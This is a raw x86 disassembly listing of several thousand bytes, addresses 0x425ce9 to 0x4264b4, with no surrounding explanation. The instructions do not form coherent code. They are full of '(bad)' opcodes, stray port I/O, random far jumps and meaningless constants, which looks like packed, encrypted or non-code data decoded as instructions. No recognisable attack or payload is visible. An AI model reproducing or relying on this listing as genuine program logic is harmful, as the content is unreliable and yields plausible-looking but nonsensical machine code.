  425ce9:	das    
  425cea:	add    DWORD PTR [ebx-0xd],esi
  425ced:	call   0x1713:0x92e7f600
  425cf4:	pushf  
  425cf5:	shl    BYTE PTR [eax+0x57],1
  425cf8:	in     eax,0x34
  425cfa:	dec    ebp
  425cfb:	xchg   ecx,eax
  425cfc:	adc    al,0x84
  425cfe:	sub    cl,BYTE PTR [eax-0x3]
  425d01:	xchg   ebx,eax
  425d02:	adc    eax,0x17
	...
  425d0f:	add    BYTE PTR [eax],al
  425d11:	pop    edx
  425d12:	push   ecx
  425d13:	leave  
  425d14:	popf   
  425d15:	retf   
  425d16:	popf   
  425d17:	pop    esi
  425d18:	xlat   BYTE PTR ds:[ebx]
  425d19:	loope  0x425d6f
  425d1b:	fs lock mov ecx,0xcb209fb9
  425d22:	rol    DWORD PTR [ecx],cl
  425d24:	add    BYTE PTR [ebx+0x66000003],ch
  425d2a:	cmp    eax,0xb45bdacb
  425d2f:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425d31:	fs mov al,ss:0xe645fd62
  425d38:	dec    edi
  425d39:	xchg   ebp,eax
  425d3a:	mov    edx,0xfadb9e8d
  425d3f:	xchg   ebp,eax
  425d40:	das    
  425d41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d42:	cmp    eax,0x69661d28
  425d47:	pop    edx
  425d48:	lea    ebx,[ecx+0x19]
  425d4b:	jge    0x425d5c
  425d4d:	imul   edx,DWORD PTR [edi-0x68],0x31fe3e19
  425d54:	and    ecx,DWORD PTR [ebx+0x18]
  425d57:	or     al,0x84
  425d59:	fld    QWORD PTR [eax-0x17]
  425d5c:	int3   
  425d5d:	fwait
  425d5e:	fwait
  425d5f:	push   edx
  425d60:	sub    DWORD PTR [esi],ecx
  425d62:	call   0x3418417e
  425d67:	xchg   esi,eax
  425d68:	popf   
  425d69:	adc    cl,BYTE PTR [eax]
  425d6b:	cdq    
  425d6c:	adc    eax,0xdc88092e
  425d71:	inc    ebx
  425d72:	das    
  425d73:	mov    ebx,0x149d3cbe
  425d78:	loopne 0x425d59
  425d7a:	add    BYTE PTR [edi+0x588fa286],0xdb
  425d81:	test   al,0xcd
  425d83:	outs   dx,DWORD PTR ds:[esi]
  425d84:	ins    DWORD PTR es:[edi],dx
  425d85:	or     DWORD PTR [eax-0x3e],ebp
  425d88:	add    DWORD PTR [ebp-0x20],eax
  425d8b:	js     0x425d50
  425d8d:	mov    cl,0x71
  425d8f:	adc    BYTE PTR [esi+0x5b],al
  425d92:	push   ebx
  425d93:	sub    al,0x85
  425d95:	cmp    BYTE PTR [edx+0x17953659],cl
  425d9b:	shl    DWORD PTR [esi-0x43e84d7c],1
  425da1:	mov    bl,0xd
  425da3:	adc    ebx,DWORD PTR [ecx]
  425da5:	pop    edx
  425da6:	(bad)  
  425da7:	data16 aad 0xef
  425daa:	ins    BYTE PTR es:[edi],dx
  425dab:	cmp    al,BYTE PTR ds:0xe74f10b3
  425db1:	fiadd  DWORD PTR [esi-0x6ed13bd2]
  425db7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425db8:	and    BYTE PTR [eax],dh
  425dba:	test   al,0x5f
  425dbc:	arpl   ax,bx
  425dbe:	aam    0x39
  425dc0:	enter  0xb940,0x1e
  425dc4:	dec    esi
  425dc5:	jl     0x425e26
  425dc7:	sbb    edx,edx
  425dc9:	enter  0xec5d,0x54
  425dcd:	popa   
  425dce:	fldcw  WORD PTR ds:0x31470805
  425dd4:	xchg   edx,eax
  425dd5:	mov    WORD PTR [esi],?
  425dd7:	in     al,0xc6
  425dd9:	push   ecx
  425dda:	push   eax
  425ddb:	sahf   
  425ddc:	push   cs
  425ddd:	popf   
  425dde:	adc    ebp,DWORD PTR [ebx+0x19]
  425de1:	mov    esp,0xe239712f
  425de6:	sub    al,0x11
  425de8:	into   
  425de9:	out    dx,eax
  425dea:	inc    ebp
  425deb:	jle    0x425e6a
  425ded:	mov    edi,0x69917fb7
  425df2:	jmp    0x6157:0x2471fb72
  425df9:	retf   
  425dfa:	dec    ebx
  425dfb:	into   
  425dfc:	xchg   ebp,eax
  425dfd:	and    dh,bh
  425dff:	and    DWORD PTR [esi+0x4d],0x2de144f2
  425e06:	sbb    al,0x4f
  425e08:	sub    BYTE PTR [edx],dl
  425e0a:	xchg   BYTE PTR [edi],dh
  425e0c:	jns    0x425e56
  425e0e:	(bad)  
  425e0f:	sbb    eax,0x5f0cb0d9
  425e14:	test   al,0xbc
  425e16:	ror    BYTE PTR [ecx-0x66d17259],cl
  425e1c:	cli    
  425e1d:	retf   0xfea2
  425e20:	cmc    
  425e21:	sbb    eax,0xae39f1e1
  425e26:	mov    ss,WORD PTR [ebx]
  425e28:	xchg   DWORD PTR [ebp+0x473122a5],esp
  425e2e:	imul   esi,DWORD PTR [ebp-0x4c],0xffffffbb
  425e32:	jne    0x425de8
  425e34:	fisttp QWORD PTR ss:[ebx-0x3e]
  425e38:	test   eax,0x9ec41704
  425e3d:	xchg   BYTE PTR [esi+0x15222940],bl
  425e43:	or     esi,ebx
  425e45:	stos   DWORD PTR es:[edi],eax
  425e46:	pop    ss
  425e47:	test   eax,0x923472c8
  425e4c:	add    BYTE PTR [esi-0x52],cl
  425e4f:	fadd   DWORD PTR [esi+0x29]
  425e52:	stc    
  425e53:	push   esp
  425e54:	pop    esi
  425e55:	push   ebp
  425e56:	test   DWORD PTR [ebx-0x4734be72],0x84a19bf8
  425e60:	push   eax
  425e61:	sbb    DWORD PTR [bx+si],ebp
  425e64:	sti    
  425e65:	out    dx,al
  425e66:	cmc    
  425e67:	xlat   BYTE PTR ds:[ebx]
  425e68:	iret   
  425e69:	add    BYTE PTR [eax-0x632b881f],bl
  425e6f:	fwait
  425e70:	add    DWORD PTR [edi+0x9],edx
  425e73:	adc    BYTE PTR [edi+edx*4-0x3a],bl
  425e77:	xor    esi,ebx
  425e79:	mov    esp,DWORD PTR [ecx]
  425e7b:	mov    ds:0x526af4b4,eax
  425e80:	test   BYTE PTR [ebp+0x6c],cl
  425e83:	xor    esi,DWORD PTR [ecx+esi*2-0x2d9c122b]
  425e8a:	in     al,dx
  425e8b:	cmc    
  425e8c:	sub    al,ch
  425e8e:	arpl   bp,di
  425e90:	inc    ebx
  425e91:	sti    
  425e92:	ficom  WORD PTR [ebp+0x5b3d965f]
  425e98:	jmp    0xb2698c3b
  425e9d:	in     al,dx
  425e9e:	jno    0x425eea
  425ea0:	int3   
  425ea1:	scas   al,BYTE PTR es:[edi]
  425ea2:	rol    BYTE PTR [edi-0xa],0xc3
  425ea6:	pop    ebx
  425ea7:	sub    edx,DWORD PTR [edx-0x242dbd00]
  425ead:	xor    ch,BYTE PTR [ebx]
  425eaf:	ss xchg edx,eax
  425eb1:	pop    ebx
  425eb2:	xchg   bh,dl
  425eb4:	sar    BYTE PTR [ecx],cl
  425eb6:	ins    DWORD PTR es:[edi],dx
  425eb7:	jno    0x425ef0
  425eb9:	add    bl,BYTE PTR [ebp+ebx*4-0x79]
  425ebd:	dec    esi
  425ebe:	int    0x3b
  425ec0:	jg     0x425ed3
  425ec2:	mov    ds:0xf9c27cf0,al
  425ec7:	xor    eax,0x821548dd
  425ecc:	mov    dl,0xad
  425ece:	js     0x425ef9
  425ed0:	xor    cl,bh
  425ed2:	repnz adc DWORD PTR [ecx-0x3145b022],0x93462cf2
  425edd:	add    eax,0x18498f39
  425ee2:	mov    edi,0x2dbf8abb
  425ee7:	mov    DWORD PTR [esi+0x7af393a2],edi
  425eed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425eee:	scas   eax,DWORD PTR es:[edi]
  425eef:	mov    ds:0x73df02f8,al
  425ef4:	inc    edx
  425ef5:	shl    dh,1
  425ef7:	les    ebp,FWORD PTR [esi+0x62]
  425efa:	std    
  425efb:	in     eax,dx
  425efc:	jle    0x425f30
  425efe:	retf   0x512b
  425f01:	ins    DWORD PTR es:[edi],dx
  425f02:	div    al
  425f04:	leave  
  425f05:	mov    cl,0xc2
  425f07:	fist   WORD PTR ds:0x9f4bdf4b
  425f0d:	mov    ch,0x7
  425f0f:	mov    ch,0x1f
  425f11:	pop    ecx
  425f12:	jnp    0x425f76
  425f14:	push   0xffffff88
  425f16:	popf   
  425f17:	idiv   BYTE PTR [esi+0x6b]
  425f1a:	lods   eax,DWORD PTR ds:[esi]
  425f1b:	dec    edx
  425f1c:	xor    bl,bh
  425f1e:	xchg   al,al
  425f20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f21:	and    eax,0xf957840f
  425f26:	mov    eax,ds:0xc2a66254
  425f2b:	mov    ds:0x60e3837c,eax
  425f30:	js     0x425fac
  425f32:	push   ebp
  425f33:	sbb    DWORD PTR [edx+0x40],ebx
  425f36:	dec    ebp
  425f37:	enter  0xaa52,0x8c
  425f3b:	addr16 pushf 
  425f3d:	xor    dh,ah
  425f3f:	xchg   edi,eax
  425f40:	adc    dh,BYTE PTR [esi]
  425f42:	cdq    
  425f43:	xor    BYTE PTR [eax+eiz*4+0x0],dl
  425f47:	cmp    eax,0xfe2f4648
  425f4c:	xchg   BYTE PTR [ecx],dh
  425f4e:	jp     0x425efa
  425f50:	push   0x2e
  425f52:	pop    ebx
  425f53:	loope  0x425f7f
  425f55:	cs je  0x425f9a
  425f58:	icebp  
  425f59:	mov    cl,0xa7
  425f5b:	aad    0x49
  425f5d:	sbb    bl,cl
  425f5f:	fcomp  st(2)
  425f61:	push   cs
  425f62:	dec    eax
  425f63:	imul   ebx,DWORD PTR [edx-0x7e4a35a4],0xb8044569
  425f6d:	mov    cl,0x10
  425f6f:	fs dec esi
  425f71:	adc    al,0xe4
  425f73:	fchs   
  425f75:	jnp    0x425f8c
  425f77:	mov    edx,0xa0e16827
  425f7c:	enter  0xfc54,0xf9
  425f80:	frstor [esi-0x43]
  425f83:	jno    0x425ffb
  425f85:	adc    ch,BYTE PTR [ebx+eiz*1-0x31]
  425f89:	inc    ebp
  425f8a:	addr16 icebp 
  425f8c:	ins    BYTE PTR es:[edi],dx
  425f8d:	or     cl,BYTE PTR [edi-0x6]
  425f90:	push   0x32
  425f92:	out    0x30,al
  425f94:	add    dh,0xb0
  425f97:	mov    bh,0xab
  425f99:	mov    ch,0x68
  425f9b:	cmp    eax,eax
  425f9d:	pop    esp
  425f9e:	xor    eax,0x62551c4c
  425fa3:	inc    esi
  425fa4:	cmp    al,0x8c
  425fa6:	mov    al,0x1f
  425fa8:	in     al,0xd4
  425faa:	or     eax,0xf4d03f69
  425faf:	push   ebx
  425fb0:	daa    
  425fb1:	mov    dh,0xa0
  425fb3:	mov    dl,0x6f
  425fb5:	outs   dx,BYTE PTR ds:[esi]
  425fb6:	pop    edx
  425fb7:	fidiv  WORD PTR [ebp+eiz*2+0x6fa8ab6f]
  425fbe:	call   0x783b0b56
  425fc3:	and    bl,ch
  425fc5:	out    0x7e,eax
  425fc7:	jmp    0x7e2b:0xdde5a1e3
  425fce:	fnsave [esi]
  425fd0:	cdq    
  425fd1:	ss cmc 
  425fd3:	sbb    DWORD PTR [esi-0x1f],ebx
  425fd6:	sbb    DWORD PTR [edi+0x73],eax
  425fd9:	xor    al,0x72
  425fdb:	adc    al,0x95
  425fdd:	fmul   st(4),st
  425fdf:	pop    es
  425fe0:	xor    eax,0x85d2499d
  425fe5:	stos   DWORD PTR es:[edi],eax
  425fe6:	out    dx,eax
  425fe7:	ror    BYTE PTR ds:0x8f9f7d33,0x55
  425fee:	xchg   BYTE PTR [ebp-0x67],cl
  425ff1:	in     al,0x6d
  425ff3:	adc    eax,0xe1a2007b
  425ff8:	(bad)
  425ffb:	or     esi,edi
  425ffd:	idiv   al
  425fff:	mov    WORD PTR [ecx-0x5d29a855],ds
  426005:	das    
  426006:	xchg   esi,eax
  426007:	sbb    DWORD PTR [esp+edx*2],edx
  42600a:	add    BYTE PTR [esi],ch
  42600c:	xchg   ecx,eax
  42600d:	mov    ch,0x37
  42600f:	out    0x52,eax
  426011:	ret    
  426012:	and    ch,BYTE PTR [esi+0x36680436]
  426018:	arpl   WORD PTR [edi],dx
  42601a:	dec    edx
  42601b:	shl    ch,0x2a
  42601e:	fwait
  42601f:	clc    
  426020:	clc    
  426021:	mov    esp,0x80f9c697
  426026:	fnstcw WORD PTR [ecx]
  426028:	push   0x5e72e7e
  42602d:	bound  esi,QWORD PTR [ebx-0x285ef647]
  426033:	in     al,dx
  426034:	dec    ecx
  426035:	mov    dl,0x89
  426037:	outs   dx,DWORD PTR ds:[esi]
  426038:	xchg   edi,eax
  426039:	xor    al,0x21
  42603b:	je     0x426034
  42603d:	jo     0x425fdf
  42603f:	fadd   QWORD PTR gs:[ecx-0x73]
  426043:	xchg   edx,eax
  426044:	jnp    0x426021
  426046:	push   ss
  426047:	repz loop 0x426087
  42604a:	sbb    DWORD PTR [ecx+0x6f],ecx
  42604d:	pop    ebp
  42604e:	ja     0x425fff
  426050:	push   esi
  426051:	fwait
  426052:	iret   
  426053:	in     eax,dx
  426054:	and    BYTE PTR [edx+0x7cbf31a2],ch
  42605a:	xchg   ebp,eax
  42605b:	mov    bh,0x5c
  42605d:	cmp    DWORD PTR ds:0x418d8ee9,0x74
  426064:	push   0xffffff98
  426066:	jbe    0x4260c4
  426068:	push   ebp
  426069:	mov    ebx,0xc07b5222
  42606e:	test   DWORD PTR [edx+0x3e],ebx
  426071:	jp     0x42601a
  426073:	icebp  
  426074:	mov    eax,0x229baf84
  426079:	push   es
  42607a:	addr16 dec eax
  42607c:	cmc    
  42607d:	(bad)  
  42607e:	mov    al,0x3e
  426080:	adc    BYTE PTR [edi],dl
  426082:	pop    ss
  426083:	retf   0xb04a
  426086:	sub    al,0x35
  426088:	or     al,0x9d
  42608a:	push   ebp
  42608b:	mov    ecx,es
  42608d:	stos   BYTE PTR es:[edi],al
  42608e:	and    DWORD PTR [edi-0x40fa0ed3],ecx
  426094:	or     al,0x65
  426096:	ret    0x985a
  426099:	adc    eax,0xdf31f08c
  42609e:	push   edx
  42609f:	mov    ds:0x93141f80,al
  4260a4:	dec    ecx
  4260a5:	add    bl,bh
  4260a7:	mov    al,ds:0xfede078e
  4260ac:	push   ebx
  4260ad:	div    BYTE PTR [edi-0x4ea968f3]
  4260b3:	pop    eax
  4260b4:	pushf  
  4260b5:	loop   0x426126
  4260b7:	sub    esi,DWORD PTR [esi]
  4260b9:	ins    BYTE PTR es:[edi],dx
  4260ba:	mov    bh,0x4e
  4260bc:	clc    
  4260bd:	or     ebx,edi
  4260bf:	jl     0x42604c
  4260c1:	(bad)  [edi]
  4260c3:	lods   al,BYTE PTR ds:[esi]
  4260c4:	(bad)  
  4260c5:	shr    DWORD PTR [eax],cl
  4260c7:	shr    DWORD PTR fs:0x17d32a4d,1
  4260ce:	shl    DWORD PTR [ecx+0x1eb01e85],cl
	...
  4260e0:	add    BYTE PTR [edx],bl
  4260e2:	call   0x3e3d72
  4260e7:	pop    edi
  4260e8:	out    dx,al
  4260e9:	dec    edx
  4260ea:	pop    esi
  4260eb:	popa   
  4260ec:	sub    ecx,DWORD PTR [ebx+0x2d]
  4260ef:	stos   DWORD PTR es:[edi],eax
  4260f0:	outs   dx,DWORD PTR ds:[esi]
  4260f1:	jbe    0x4260ca
  4260f3:	add    DWORD PTR [eax],eax
  4260f5:	stos   DWORD PTR es:[edi],eax
  4260f6:	add    eax,DWORD PTR [eax]
  4260f8:	add    dl,dl
  4260fa:	into   
  4260fb:	mov    ebx,esp
  4260fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260fe:	push   eax
  4260ff:	mov    bh,0x3c
  426101:	stc    
  426102:	mov    dl,0xc1
  426104:	loop   0x426136
  426106:	sub    eax,DWORD PTR [edx-0x7ca0e25a]
  42610c:	lds    ebp,FWORD PTR [eax-0x5c5e92ff]
  426112:	ja     0x4260ad
  426114:	rcl    edi,cl
  426116:	add    al,0xab
  426118:	js     0x426166
  42611a:	add    BYTE PTR [eax],0x21
  42611d:	add    DWORD PTR [edx-0x5e],ecx
  426120:	jmp    0x8c2:0x4518ee70
  426127:	fisubr DWORD PTR [ecx+0x59]
  42612a:	(bad)  
  42612b:	or     BYTE PTR [ecx+0x36],dh
  42612e:	or     edi,DWORD PTR [edi]
  426130:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426131:	test   BYTE PTR [edi-0x31],0xd
  426135:	clc    
  426136:	mov    DWORD PTR [edx],0x9230e560
  42613c:	sahf   
  42613d:	xor    BYTE PTR [eax-0x3c],ah
  426140:	jns    0x4261a7
  426142:	sub    bl,BYTE PTR [edx]
  426144:	aam    0x65
  426146:	push   esp
  426147:	dec    esp
  426148:	inc    edx
  426149:	int3   
  42614a:	xchg   BYTE PTR [esi],ch
  42614c:	mov    eax,0xe62f7f42
  426151:	or     eax,0x6bb6f318
  426156:	stos   BYTE PTR es:[edi],al
  426157:	xor    DWORD PTR [ecx-0x24d5cf6e],0x71
  42615e:	aam    0xc8
  426160:	jno    0x42616a
  426162:	push   edi
  426163:	sbb    dl,ah
  426165:	mov    dl,0x22
  426167:	mov    ds:0x23754a51,eax
  42616c:	jl     0x4261db
  42616e:	jle    0x42616e
  426170:	in     eax,0xf4
  426172:	(bad)  
  426173:	out    0x5b,al
  426175:	jnp    0x4261c7
  426177:	retf   
  426178:	xchg   ecx,eax
  426179:	in     eax,dx
  42617a:	mov    bh,0xd1
  42617c:	inc    ecx
  42617d:	sbb    BYTE PTR [edi+0x3a864e06],0x16
  426184:	lock xor dh,ah
  426187:	add    BYTE PTR [ebx+eiz*2+0x69],bl
  42618b:	mov    ch,0xd
  42618d:	(bad)  
  42618e:	and    eax,DWORD PTR [eax+0x747d3c67]
  426194:	push   ebx
  426195:	and    DWORD PTR ds:0xcc18c685,edi
  42619b:	sub    ebx,esi
  42619d:	or     DWORD PTR [ebx+0x7a6f12c8],edi
  4261a3:	jp     0x42619b
  4261a5:	jb     0x4261fd
  4261a7:	inc    esi
  4261a8:	mov    DWORD PTR [edx-0x7a8baca6],ebp
  4261ae:	pop    ebx
  4261af:	mov    edi,0x4a6a8bcc
  4261b4:	hlt    
  4261b5:	mov    edx,0x56a182f7
  4261ba:	mov    ebx,0x65584cfd
  4261bf:	cmp    DWORD PTR [esi-0x2a],0x3
  4261c3:	cli    
  4261c4:	aas    
  4261c5:	pop    esp
  4261c6:	fisttp WORD PTR [edi-0x18]
  4261c9:	adc    eax,DWORD PTR [esi]
  4261cb:	push   ecx
  4261cc:	cmp    al,0x43
  4261ce:	ror    BYTE PTR [ecx+0x7b],1
  4261d1:	xor    BYTE PTR [esi-0x62],bh
  4261d4:	mov    dl,0xee
  4261d6:	out    dx,al
  4261d7:	xchg   BYTE PTR [edx+0x71],ah
  4261da:	call   0xceaa:0xb6220301
  4261e1:	xchg   ebx,eax
  4261e2:	(bad)  
  4261e3:	call   DWORD PTR [esi]
  4261e5:	jbe    0x426247
  4261e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4261e8:	inc    ebp
  4261e9:	ror    DWORD PTR [esi+0x6c],1
  4261ec:	or     bl,BYTE PTR [eax-0x5d]
  4261ef:	push   esp
  4261f0:	pop    ebp
  4261f1:	dec    edi
  4261f2:	add    al,0xd2
  4261f4:	js     0x4261c2
  4261f6:	push   es
  4261f7:	adc    DWORD PTR [edx],0x7b
  4261fa:	dec    ebx
  4261fb:	push   ss
  4261fc:	(bad)  
  4261fd:	xor    DWORD PTR [ecx+0x1f9f568f],edx
  426203:	xlat   BYTE PTR ds:[ebx]
  426204:	adc    BYTE PTR [edx-0x43],bl
  426207:	add    DWORD PTR [ebx],0xffffffa7
  42620a:	mov    al,0x6e
  42620c:	pop    esp
  42620d:	std    
  42620e:	popa   
  42620f:	in     al,0x38
  426211:	mov    ebx,0xa3b271dd
  426216:	or     dl,BYTE PTR [ebx+esi*8-0x4a5b89f]
  42621d:	push   ss
  42621e:	lea    edi,[edi]
  426220:	inc    ebp
  426221:	ret    
  426222:	test   eax,0x8d485a0d
  426227:	lock pusha 
  426229:	mov    al,cl
  42622b:	sub    al,0x18
  42622d:	je     0x426248
  42622f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426230:	cmp    eax,0xde628d1f
  426235:	rol    DWORD PTR [ecx],cl
  426237:	jno    0x42628c
  426239:	or     esi,DWORD PTR [ebp+0x5f]
  42623c:	outs   dx,DWORD PTR ds:[esi]
  42623d:	and    eax,0xc3ebff3e
  426242:	sub    DWORD PTR [esi-0x28],esi
  426245:	bnd jnp 0x42629f
  426248:	and    al,0xd8
  42624a:	or     eax,DWORD PTR [esi]
  42624c:	rol    DWORD PTR [ebp-0x76],cl
  42624f:	mov    esi,0x94c84e18
  426254:	pushf  
  426255:	call   0x79be092e
  42625a:	and    edx,esi
  42625c:	fiadd  DWORD PTR [ebp+ebx*2+0xa]
  426260:	push   cs
  426261:	lds    edi,FWORD PTR [eax-0x1b]
  426264:	or     ecx,esi
  426266:	xor    bl,BYTE PTR [edx-0x1e]
  426269:	mov    ds,WORD PTR [ecx]
  42626b:	pop    ss
  42626c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42626d:	imul   edx,DWORD PTR [ecx-0xea01af8],0xd64d47c3
  426277:	rcl    BYTE PTR [edi-0x69494a21],1
  42627d:	mov    BYTE PTR [ebx-0x73],dl
  426280:	push   edx
  426281:	inc    ecx
  426282:	stos   DWORD PTR es:[edi],eax
  426283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426284:	loop   0x42625a
  426286:	mov    ds:0x6ab491d5,al
  42628b:	pop    es
  42628c:	sar    ecx,1
  42628e:	subps  xmm7,xmm7
  426291:	mov    al,0x76
  426293:	repnz das 
  426295:	(bad)  
  426296:	frndint 
  426298:	rcl    DWORD PTR [ebp+ecx*4-0x19],0x9c
  42629d:	in     al,dx
  42629e:	imul   eax,edx,0xfbd8511e
  4262a4:	test   DWORD PTR [edx],0x2643fa23
  4262aa:	or     bl,BYTE PTR [ebp+0x6b12c196]
  4262b0:	daa    
  4262b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4262b2:	dec    esi
  4262b3:	les    edx,FWORD PTR [bx+si]
  4262b6:	(bad)  
  4262b7:	enter  0x3b9d,0x1a
  4262bb:	psrlw  mm6,QWORD PTR [ecx+0x62]
  4262bf:	inc    esi
  4262c0:	and    eax,DWORD PTR [ebx-0x61]
  4262c3:	pop    eax
  4262c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4262c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4262c6:	push   eax
  4262c7:	cli    
  4262c8:	outs   dx,WORD PTR ds:[esi]
  4262ca:	mov    ah,0xf1
  4262cc:	inc    edi
  4262cd:	je     0x426343
  4262cf:	or     al,0x9b
  4262d1:	push   edx
  4262d2:	aas    
  4262d3:	push   edx
  4262d4:	inc    eax
  4262d5:	lods   eax,DWORD PTR ds:[esi]
  4262d6:	enter  0xd731,0x46
  4262da:	(bad)  
  4262db:	into   
  4262dc:	jnp    0x42634f
  4262de:	loopne 0x4262a3
  4262e0:	out    dx,eax
  4262e1:	mov    ah,0x46
  4262e3:	shl    DWORD PTR [edi-0x4db2e973],0x7
  4262ea:	std    
  4262eb:	cli    
  4262ec:	aas    
  4262ed:	bound  esi,QWORD PTR [eax+0x57]
  4262f0:	inc    ebp
  4262f1:	jp     0x426279
  4262f3:	cmp    ebp,DWORD PTR [eax-0x50cdb0ed]
  4262f9:	outs   dx,BYTE PTR ds:[esi]
  4262fa:	xor    al,bh
  4262fc:	inc    ebp
  4262fd:	lods   eax,DWORD PTR ds:[esi]
  4262fe:	aad    0xca
  426300:	mov    ch,BYTE PTR [ecx+0x77]
  426303:	rcr    DWORD PTR [ebx],0x96
  426306:	aas    
  426307:	mov    gs,WORD PTR ds:0xa38a2cb3
  42630d:	ret    
  42630e:	xchg   ecx,eax
  42630f:	cli    
  426310:	xchg   edi,eax
  426311:	outs   dx,DWORD PTR ds:[esi]
  426312:	fst    st(1)
  426314:	inc    ebp
  426315:	xor    eax,0x9cfcdd0
  42631a:	pop    ecx
  42631b:	loopne 0x4262f3
  42631d:	(bad)  
  42631e:	icebp  
  42631f:	test   DWORD PTR [ecx-0x1f],eax
  426322:	sbb    dl,ch
  426324:	cmp    DWORD PTR [eax-0x23],ebp
  426327:	adc    esp,DWORD PTR [ebx-0x58b1fb6c]
  42632d:	xor    BYTE PTR [ecx+0x4ad0f701],dl
  426333:	clc    
  426334:	jmp    0xc9aa73cd
  426339:	je     0x426397
  42633b:	xchg   edi,eax
  42633c:	dec    edx
  42633d:	sub    cl,BYTE PTR [ebx+0x9b8927c]
  426343:	mov    cl,0x51
  426345:	sbb    al,0x8
  426347:	cmp    DWORD PTR [esi+esi*4],eax
  42634a:	daa    
  42634b:	and    BYTE PTR [esp+ebp*1-0x5d13a56],ch
  426352:	out    0x1b,eax
  426354:	or     dh,BYTE PTR [edi]
  426356:	cmp    bh,bl
  426358:	loope  0x4263c6
  42635a:	and    bl,ch
  42635c:	adc    BYTE PTR [eax],dh
  42635e:	aam    0xff
  426360:	lds    esp,FWORD PTR [edx+0x79]
  426363:	dec    ebp
  426364:	adc    BYTE PTR ds:0xd7e416fb,al
  42636a:	ins    DWORD PTR es:[edi],dx
  42636b:	ret    0x11fb
  42636e:	rcr    BYTE PTR [eax+edx*8+0x1259e08a],0xfe
  426376:	aam    0x54
  426378:	cwde   
  426379:	bound  ebp,QWORD PTR [esi-0x5a]
  42637c:	ret    
  42637d:	mov    esp,0xa821f97f
  426382:	iret   
  426383:	aaa    
  426384:	mov    ch,0x23
  426386:	and    ch,cl
  426388:	jns    0x42638c
  42638a:	call   0x6cb488a7
  42638f:	fsubr  DWORD PTR [ecx+0x40379c2e]
  426395:	xor    ebx,esp
  426397:	fiadd  DWORD PTR [eax]
  426399:	jns    0x4263b6
  42639b:	push   0xffffffa9
  42639d:	push   cs
  42639e:	cwde   
  42639f:	(bad)  
  4263a1:	xchg   esi,eax
  4263a2:	xchg   edi,eax
  4263a3:	pushf  
  4263a4:	pop    ecx
  4263a5:	push   edi
  4263a6:	inc    ebp
  4263a7:	mov    BYTE PTR [edx+0x28c9ed9d],dl
  4263ad:	popa   
  4263ae:	push   ecx
  4263af:	(bad)  
  4263b1:	ret    0x1883
  4263b4:	dec    eax
  4263b5:	inc    edi
  4263b6:	int    0x2a
  4263b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4263b9:	cmp    al,0x9d
  4263bb:	xor    edi,DWORD PTR [esi]
  4263bd:	xor    eax,0x4f6204da
  4263c2:	sbb    DWORD PTR [edi-0x13d6edb5],ebx
  4263c8:	jp     0x4263db
  4263ca:	cmp    BYTE PTR [edi-0x7e],ch
  4263cd:	jge    0x426436
  4263cf:	aam    0x6b
  4263d1:	mov    ah,0x30
  4263d3:	(bad)  
  4263d4:	pop    ds
  4263d5:	aad    0xbf
  4263d7:	out    dx,eax
  4263d8:	sub    al,0x8d
  4263da:	aam    0x33
  4263dc:	add    DWORD PTR [edi],eax
  4263de:	dec    ecx
  4263df:	or     ebp,ebp
  4263e1:	mov    dh,0x17
  4263e3:	and    al,0xbd
  4263e5:	stc    
  4263e6:	(bad)  
  4263e7:	push   ebx
  4263e8:	inc    esp
  4263e9:	sbb    BYTE PTR [esi],ah
  4263eb:	jmp    0x312a:0x7ca8568c
  4263f2:	jmp    0x83f5:0xff7c329c
  4263f9:	mov    edx,0x7ce0b3b0
  4263fe:	dec    ecx
  4263ff:	inc    ecx
  426400:	fs sub eax,0xfcf435d6
  426406:	pop    edi
  426407:	pushf  
  426408:	pop    edx
  426409:	dec    esi
  42640a:	call   0x48a9:0x1dff13d5
  426411:	in     al,0x95
  426413:	rol    BYTE PTR [esp+edx*8-0x37d0f6aa],0xc4
  42641b:	sub    BYTE PTR [ecx+0xabbb897],0x80
  426422:	(bad)  
  426423:	mov    al,ds:0xf5ca610f
  426428:	out    0xf6,al
  42642a:	ja     0x426452
  42642c:	cs mov ebp,0x76eaf9e
  426432:	sub    esi,DWORD PTR [edi]
  426434:	lock mov ebx,0x7fd21f77
  42643a:	imul   edx,DWORD PTR [esi-0x3a162848],0x47fcb5fc
  426444:	popf   
  426445:	es pop esp
  426447:	mov    esi,0x1f24c114
  42644c:	cmp    edi,DWORD PTR [eax+0x57f880dd]
  426452:	mov    bl,0x34
  426454:	pop    eax
  426455:	outs   dx,DWORD PTR ds:[esi]
  426456:	arpl   dx,si
  426458:	push   ecx
  426459:	or     eax,0xd5713df3
  42645e:	and    ah,BYTE PTR [ebp-0x6b]
  426461:	or     al,0x0
  426463:	lea    edx,[esp+ebp*8]
  426466:	pop    es
  426467:	test   DWORD PTR [esp+ecx*4-0x7eafc4e9],ecx
  42646e:	mov    ds:0xdbe86e26,al
  426473:	loopne 0x426410
  426475:	add    DWORD PTR [eax+ecx*1],ebx
  426478:	(bad)  
  426479:	xor    esi,esi
  42647b:	cwde   
  42647c:	rol    DWORD PTR [esi-0x615ad8ec],cl
  426482:	cmp    BYTE PTR [eax+ebx*4],cl
  426485:	aaa    
  426486:	jmp    0x547b:0x77967d43
  42648d:	adc    BYTE PTR [edi],cl
  42648f:	popf   
  426490:	(bad)  
  426491:	not    BYTE PTR [ebx]
  426493:	sar    BYTE PTR [ebx],0x49
  426496:	jo     0x426481
  426498:	dec    ebp
  426499:	xor    al,0x26
  42649b:	lahf   
  42649c:	(bad)  
  42649d:	mov    ecx,0x8624d65f
  4264a2:	fidivr WORD PTR [edi+0x0]
	...
  4264b1:	loop   0x42652e
  4264b3:	push   ecx
  4264b4:	data16 fldcw WORD PTR [esi-0x9]
